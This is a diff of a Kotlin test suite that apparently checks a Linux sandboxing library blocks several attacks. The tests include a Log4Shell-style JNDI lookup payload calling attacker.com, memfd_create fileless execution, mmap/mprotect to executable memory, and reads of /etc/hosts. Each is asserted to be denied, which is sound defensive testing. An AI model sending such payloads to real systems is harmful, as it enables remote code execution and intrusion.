@@ -1,19 +1,22 @@
 package demo
-
-import io.mazewall.LinuxNative
-import io.mazewall.Policy
-import io.mazewall.core.Arch
-import io.mazewall.enforcer.api.ContainedExecutors
 import io.mazewall.enforcer.api.ContainmentViolationEvidence
 import io.mazewall.enforcer.api.ContainmentViolationException
+import io.mazewall.enforcer.api.Policy
+import io.mazewall.enforcer.api.ProcessPolicyBuilder
+import io.mazewall.enforcer.api.RuntimeProfile
+import io.mazewall.enforcer.api.execution.DomainLimits
 import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import io.mazewall.ffi.NativeConstants
 import io.mazewall.ffi.memory.ConfinedSegment
+import io.mazewall.platform.native.LinuxNative
+import io.mazewall.platform.syscall.Arch
+import io.mazewall.platform.syscall.NativeArg
 import org.junit.jupiter.api.Test
 import java.io.File
-import java.lang.foreign.*
+import java.lang.foreign.Arena
+import java.util.concurrent.Callable
 import java.util.concurrent.ExecutionException
-import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 import kotlin.test.assertEquals
 import kotlin.test.assertFailsWith
 import kotlin.test.assertFalse
@@ -21,56 +24,87 @@ import kotlin.test.assertTrue
 
 class ProtectionDemonstrationTest {
     @Test
+    fun `non-permission native error is not authenticated containment`() {
+        val result = authenticateNativeDenial(NativeConstants.EINVAL)
+
+        assertTrue(result is ScenarioOutcome.InfrastructureFailure)
+    }
+
+    @Test
+    fun `permission native errors are authenticated containment`() {
+        assertTrue(authenticateNativeDenial(NativeConstants.EPERM) is ScenarioOutcome.Denied)
+        assertTrue(authenticateNativeDenial(NativeConstants.EACCES) is ScenarioOutcome.Denied)
+    }
+
+    @Test
     fun `Attack 1 - Classic Shell Execution Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform
+            .isSupported()
+        ) {
+                return
+            }
 
-        val marker = File("/tmp/pwned_safe")
-        marker.delete()
+        io.mazewall.enforcer.api.IsolatedProcessTester
+            .runIsolatedMethod(javaClass.name, "protectedShellBody")
+    }
 
-        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
+    @Suppress("unused")
+    fun protectedShellBody() {
+        DemoFixture.create("protected-shell").use { fixture ->
+            val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
 
-        val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
+            val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
 
-        assertEquals(
-            ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
-            ContainmentViolationDetector.diagnose(ex)?.evidence,
-            "Expected an inferred permission failure, got: ${ex.cause}",
-        )
+            assertEquals(
+                ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
+                ContainmentViolationDetector.diagnose(ex)?.evidence,
+                "Expected an inferred permission failure, got: ${ex.cause}",
+            )
 
-        assertFalse(marker.exists(), "Exploit marker should NOT exist")
+            assertFalse(fixture.marker.exists(), "Exploit marker should NOT exist")
+        }
     }
 
     @Test
     fun `Attack 2 - Fileless Payload Creation Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform
+            .isSupported()
+        ) {
+                return
+            }
 
-        val executor = Executors.newSingleThreadExecutor()
-        val safeExecutor = ContainedExecutors.wrap(executor, Policy.NO_EXEC)
+        io.mazewall.enforcer.api.IsolatedProcessTester
+            .runIsolatedMethod(javaClass.name, "protectedMemfdBody")
+    }
 
-        try {
-            safeExecutor
-                .submit {
+    fun protectedMemfdBody() {
+        OwnedDemoRuntime.run(Policy.NO_EXEC_HOTSPOT) { runtime ->
+            val domain = runtime.prepare(Policy.NO_EXEC, DomainLimits(1, 1))
+            OwnedDemoRuntime.await(
+                runtime.submit(
+                    domain,
+                    Callable {
                     val arch = Arch.current()
                     Arena.ofConfined().use { arena ->
                         val name = arena.allocateFrom("test_memfd_protected")
                         val res =
                         LinuxNative.raw.syscall(
                             arch.memfdCreate.toLong(),
-                            io.mazewall.core.NativeArg.MemoryArg(ConfinedSegment(name)),
-                            io.mazewall.core.NativeArg.NullArg,
+                            io.mazewall.platform.syscall.NativeArg
+                                .MemoryArg(ConfinedSegment(name)),
+                            io.mazewall.platform.syscall.NativeArg.NullArg,
                         )
 
                         assertTrue(res is LinuxNative.SyscallResult.Error, "memfd_create should be blocked by NO_EXEC")
                         assertEquals(NativeConstants.EPERM, (res as LinuxNative.SyscallResult.Error).errno)
                     }
-                }.get()
-        } finally {
-            safeExecutor.shutdown()
-            executor.shutdown()
+                },
+                ),
+            )
         }
     }
 
@@ -78,68 +112,69 @@ class ProtectionDemonstrationTest {
     fun `Attack 3 - Shellcode and Memory Pivoting Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
-
-        val executor = Executors.newSingleThreadExecutor()
-        val safeExecutor = ContainedExecutors.wrap(executor, Policy.builder().build())
-
-        try {
-            assertFailsWith<ExecutionException> {
-                safeExecutor
-                    .submit {
-                        val linker = Linker.nativeLinker()
-                        val mmap =
-                            linker.downcallHandle(
-                                linker.defaultLookup().find("mmap").get(),
-                                FunctionDescriptor.of(
-                                    ValueLayout.ADDRESS,
-                                    ValueLayout.ADDRESS,
-                                    ValueLayout.JAVA_LONG,
-                                    ValueLayout.JAVA_INT,
-                                    ValueLayout.JAVA_INT,
-                                    ValueLayout.JAVA_INT,
-                                    ValueLayout.JAVA_LONG,
-                                ),
-                            )
-                        val mprotect =
-                            linker.downcallHandle(
-                                linker.defaultLookup().find("mprotect").get(),
-                                FunctionDescriptor.of(
-                                    ValueLayout.JAVA_INT,
-                                    ValueLayout.ADDRESS,
-                                    ValueLayout.JAVA_LONG,
-                                    ValueLayout.JAVA_INT,
-                                ),
-                            )
-
-                        val PROT_READ = 0x1
-                        val PROT_WRITE = 0x2
-                        val PROT_EXEC = 0x4
-                        val MAP_PRIVATE = 0x02
-                        val MAP_ANONYMOUS = 0x20
-
-                        val addr =
-                            mmap.invoke(
-                                MemorySegment.NULL,
-                                4096L,
-                                PROT_READ or PROT_WRITE,
-                                MAP_PRIVATE or MAP_ANONYMOUS,
-                                -1,
-                                0L,
-                            ) as MemorySegment
-                        if (addr.address() == -1L) throw java.io.IOException("mmap failed")
-
-                        val res = mprotect.invoke(addr, 4096L, PROT_READ or PROT_EXEC) as Int
-                        if (res == -1) {
-                            throw java.io.IOException("Operation not permitted")
-                        }
-                    }.get()
-            }.let { e ->
-                assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(e)?.evidence)
+        if (!io.mazewall.enforcer.api.Platform
+            .isSupported()
+        ) {
+                return
             }
-        } finally {
-            safeExecutor.shutdown()
-            executor.shutdown()
+
+        io.mazewall.enforcer.api.IsolatedProcessTester
+            .runIsolatedMethod(javaClass.name, "protectedMappingBody")
+    }
+
+    fun protectedMappingBody() {
+        OwnedDemoRuntime.run(Policy.NO_EXEC_HOTSPOT) { runtime ->
+            val domain = runtime.prepare(ProcessPolicyBuilder.denyList(RuntimeProfile.NATIVE_IMAGE).build(), DomainLimits(1, 1))
+            val outcome =
+                OwnedDemoRuntime.await(
+                    runtime.submit(
+                        domain,
+                        Callable<ScenarioOutcome> {
+                        val arch = Arch.current()
+                        val pageSize = 4096L
+                        val mapping =
+                            LinuxNative.raw.syscall(
+                                arch.mmap.toLong(),
+                                NativeArg.NullArg,
+                                NativeArg.LongArg(pageSize),
+                                NativeArg.IntArg(PROT_READ or PROT_WRITE),
+                                NativeArg.IntArg(MAP_PRIVATE or MAP_ANONYMOUS),
+                                NativeArg.IntArg(-1),
+                                NativeArg.LongArg(0L),
+                            )
+                        val address =
+                            when (mapping) {
+                                is LinuxNative.SyscallResult.Success -> mapping.value
+                                is LinuxNative.SyscallResult.Error -> mapping.throwErrno("mmap")
+                            }
+                        try {
+                            when (
+                                val protection =
+                                    LinuxNative.raw.syscall(
+                                        arch.mprotect.toLong(),
+                                        NativeArg.LongArg(address),
+                                        NativeArg.LongArg(pageSize),
+                                        NativeArg.IntArg(PROT_READ or PROT_EXEC),
+                                    )
+                            ) {
+                                is LinuxNative.SyscallResult.Success -> ScenarioOutcome.Completed("mprotect(PROT_EXEC) succeeded")
+                                is LinuxNative.SyscallResult.Error -> {
+                                    val errno = protection.errno
+                                    authenticateNativeDenial(errno)
+                                }
+                            }
+                        } finally {
+                            LinuxNative.raw
+                                .syscall(
+                                    arch.munmap.toLong(),
+                                    NativeArg.LongArg(address),
+                                    NativeArg.LongArg(pageSize),
+                                ).getOrThrow("munmap")
+                        }
+                    },
+                    ),
+                )
+            assertTrue(outcome is ScenarioOutcome.Denied, "Expected authenticated EPERM/EACCES, got $outcome")
         }
     }
 
@@ -147,45 +182,64 @@ class ProtectionDemonstrationTest {
     fun `Attack 4 - Path Traversal Protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform
+            .isSupported()
+        ) {
+                return
+            }
 
-        val executor = Executors.newSingleThreadExecutor()
+        io.mazewall.enforcer.api.IsolatedProcessTester
+            .runIsolatedMethod(javaClass.name, "protectedTraversalBody")
+    }
+
+    fun protectedTraversalBody() {
         // PURE_COMPUTE includes PURE_COMPUTE_UNSAFE and blocks OPENAT, and automatically enables Landlock
-        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)
-
-        try {
+        OwnedDemoRuntime.run(Policy.NO_EXEC_HOTSPOT) { runtime ->
+            val domain = runtime.prepare(Policy.PURE_COMPUTE, DomainLimits(1, 1))
             assertFailsWith<ExecutionException> {
-                safeExecutor
-                    .submit {
+                runtime
+                    .submit(
+                        domain,
+                        Callable {
                         File("/etc/hosts").readText()
-                    }.get()
+                    },
+                    ).result()
+                    .toCompletableFuture()
+                    .get(10, TimeUnit.SECONDS)
             }.let { e ->
                 assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(e)?.evidence)
             }
-        } finally {
-            safeExecutor.shutdown()
-            executor.shutdown()
         }
     }
 
     @Test
-    fun `Attack 5 - io_uring Async Evasion Protected`() {
+    fun `Attack 5 - synchronous native open protected`() {
         val osName = System.getProperty("os.name")
         if (!osName.equals("Linux", ignoreCase = true)) return
-        if (!io.mazewall.Platform.isSupported()) return
+        if (!io.mazewall.enforcer.api.Platform
+            .isSupported()
+        ) {
+                return
+            }
 
-        val executor = Executors.newSingleThreadExecutor()
+        io.mazewall.enforcer.api.IsolatedProcessTester
+            .runIsolatedMethod(javaClass.name, "protectedNativeOpenBody")
+    }
+
+    fun protectedNativeOpenBody() {
         // PURE_COMPUTE uses PURE_COMPUTE_UNSAFE and automatically enables Landlock
-        val safeExecutor = ContainedExecutors.wrap(executor, Policy.PURE_COMPUTE)
-
-        try {
-            safeExecutor
-                .submit {
+        OwnedDemoRuntime.run(Policy.NO_EXEC_HOTSPOT) { runtime ->
+            val domain = runtime.prepare(Policy.PURE_COMPUTE, DomainLimits(1, 1))
+            OwnedDemoRuntime.await(
+                runtime.submit(
+                    domain,
+                    Callable {
                     Arena.ofConfined().use { arena ->
                         val openResult =
                         LinuxNative.fileSystem.open(
                             ConfinedSegment(arena.allocateFrom("/etc/hosts")),
-                            io.mazewall.core.OpenFlags(0), // O_RDONLY
+                            io.mazewall.platform.lifecycle
+                                .OpenFlags(0), // O_RDONLY
                         )
 
                         // If Landlock restricts the path, open returns -1 and errno is EACCES (13)
@@ -196,10 +250,17 @@ class ProtectionDemonstrationTest {
                             "Expected EPERM (1) or EACCES (13), got: $errno",
                         )
                     }
-                }.get()
-        } finally {
-            safeExecutor.shutdown()
-            executor.shutdown()
+                },
+                ),
+            )
         }
+    }
+
+    private companion object {
+        const val PROT_READ = 0x1
+        const val PROT_WRITE = 0x2
+        const val PROT_EXEC = 0x4
+        const val MAP_PRIVATE = 0x02
+        const val MAP_ANONYMOUS = 0x20
     }
 }
